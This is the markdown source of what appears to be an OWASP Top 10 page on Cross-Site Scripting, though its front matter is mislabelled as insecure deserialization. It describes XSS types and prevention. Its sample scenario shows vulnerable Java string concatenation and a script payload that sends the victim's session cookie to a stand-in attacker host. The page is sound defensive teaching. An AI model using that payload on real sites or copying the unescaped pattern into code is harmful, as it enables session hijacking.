---

title: A8 - Insecure Deserializatin
layout: full-width
top-ten: 7
exploitability: 3
prevalance: 3
detectability: 3
techincal: 2
og-summary: This is the summar that goes in og meta tags so when shared on social/slack it has a customized summary of the page as opposed to random front content

---

## A7 - Cross-Site Scripting (XSS)
<p> <i class="fa fa-exclamation-circle"  style="color:orange; padding-right: 5px"></i>Exploitablity
  <i class="fa fa-exclamation-triangle"  style="color:red; padding-left: 20px; padding-right: 5px"></i>Prevalence
  <i class="fa fa-exclamation-triangle"  style="color:red; padding-left: 20px; padding-right: 5px"></i>Detectability
  <i class="fa fa-skull-crossbones" style="color:black; padding-left: 20px; padding-right: 5px"></i>Technnical
</p>
The most common Cross-Site Scripting vulnerability is where the application or API includes unvalidated and unescaped user input as part of HTML output. A successful attack can allow the attacker to execute arbitrary HTML and JavaScript in the victim’s browser. Typically the user will need to interact with some malicious link that points to an attacker-controlled page, such as malicious watering hole websites, advertisements, or similar.

- Threat Agent / Attack Vectors: Automated tools can detect and exploit all three forms of XSS, and there are freely available exploitation frameworks.
- Security Weakness: XSS is the second most prevalent issue in the OWASP Top 10, and is found in around two thirds of all applications.<br/>Automated tools can find some XSS problems automatically, particularly in mature technologies such as PHP, J2EE / JSP, and ASP.NET.
- Impacts: The impact of XSS is moderate for reflected and DOM XSS, and severe for stored XSS, with remote code execution on the victim's browser, such as stealing credentials, sessions, or delivering malware to the victim.
 
### Is the Applicaton Vulnerable
There are three forms of XSS, usually targeting users' browsers:
- **Reflected XSS**: The application or API includes unvalidated and unescaped user input as part of HTML output. A successful attack can allow the attacker to execute arbitrary HTML and JavaScript in the victim’s browser. Typically the user will need to interact with some malicious link that points to an attacker-controlled page, such as malicious watering hole websites, advertisements, or similar.
- **Stored XSS**: The application or API stores unsanitized user input that is viewed at a later time by another user or an administrator. Stored XSS is often considered a high or critical risk.
- **DOM XSS**: JavaScript frameworks, single-page applications, and APIs that dynamically include attacker-controllable data to a page are vulnerable to DOM XSS. Ideally, the application would not send attacker-controllable data to unsafe JavaScript APIs.

Typical XSS attacks include session stealing, account takeover, MFA bypass, DOM node replacement or defacement (such as trojan login panels), attacks against the user's browser such as malicious software downloads, key logging, and other client-side attacks.

### How to Prevent
Preventing XSS requires separation of untrusted data from active browser content. This can be achieved by:
- Using frameworks that automatically escape XSS by design, such as the latest Ruby on Rails, React JS. Learn the limitations of each framework's XSS protection and appropriately handle the use cases which are not covered.
- Escaping untrusted HTTP request data based on the context in the HTML output (body, attribute, JavaScript, CSS, or URL) will resolve Reflected and Stored XSS vulnerabilities. The <u>[[XSS_(Cross_Site_Scripting)_Prevention_Cheat_Sheet|OWASP Cheat Sheet 'XSS Prevention']]</u> has details on the required data escaping techniques.
- Applying context-sensitive encoding when modifying the browser document on the client side acts against DOM XSS. When this cannot be avoided, similar context sensitive escaping techniques can be applied to browser APIs as described in the <u>[[DOM_based_XSS_Prevention_Cheat_Sheet|OWASP Cheat Sheet 'DOM based XSS Prevention']].
- Enabling a <u>[https://developer.mozilla.org/en-US/docs/Web/HTTP/CSP Content Security Policy (CSP)]</u> as a defense-in-depth mitigating control against XSS. It is effective if no other vulnerabilities exist that would allow placing malicious code via local file includes (e.g. path traversal overwrites or vulnerable libraries from permitted content delivery networks).

### Sample Attack Scenarios

Scenario #1: The application uses untrusted data in the construction of the following HTML snippet without validation or escaping:

```
(String) page += "<input name='creditcard' type='TEXT'<br>value='" + request.getParameter("CC") + "'>";
```

The attacker modifies the ‘CC’ parameter in the browser to:

```
'><script>document.location=<br/>'<nowiki>h</nowiki>ttp://www.attacker.com/cgi-bin/cookie.cgi?
```

This attack causes the victim’s session ID to be sent to the attacker’s website, allowing the attacker to hijack the user’s current session.

Note: Attackers can use XSS to defeat any automated Cross-Site Request Forgery (CSRF) defense the application might employ.

### References

OWASP
- [[OWASP_Proactive_Controls#tab=OWASP_Proactive_Controls_2016|OWASP Proactive Controls: Encode Data]]
- [[OWASP_Proactive_Controls#tab=OWASP_Proactive_Controls_2016|OWASP Proactive Controls: Validate Data]]
- [[:Category:OWASP_Application_Security_Verification_Standard_Project|OWASP Application Security Verification Standard: V5]]
- [[Testing_for_Reflected_Cross_site_scripting_(OTG-INPVAL-001)|OWASP Testing Guide: Testing for Reflected XSS]]
- [[Testing_for_Stored_Cross_site_scripting_(OTG-INPVAL-002)|OWASP Testing Guide: Testing for Stored XSS]]
- [[Testing_for_DOM-based_Cross_site_scripting_(OTG-CLIENT-001)|OWASP Testing Guide: Testing for DOM XSS]]
- [[XSS_(Cross_Site_Scripting)_Prevention_Cheat_Sheet|OWASP Cheat Sheet: XSS Prevention]]
- [[DOM_based_XSS_Prevention_Cheat_Sheet|OWASP Cheat Sheet: DOM based XSS Prevention]]
- [[XSS_Filter_Evasion_Cheat_Sheet|OWASP Cheat Sheet: XSS Filter Evasion]]
- [[OWASP_Java_Encoder_Project|OWASP Java Encoder Project]]

External
- [CWE-79: Improper neutralization of user supplied input](https://cwe.mitre.org/data/definitions/79.html)
- [PortSwigger: Client-side template injection](https://portswigger.net/kb/issues/00200308_clientsidetemplateinjection)
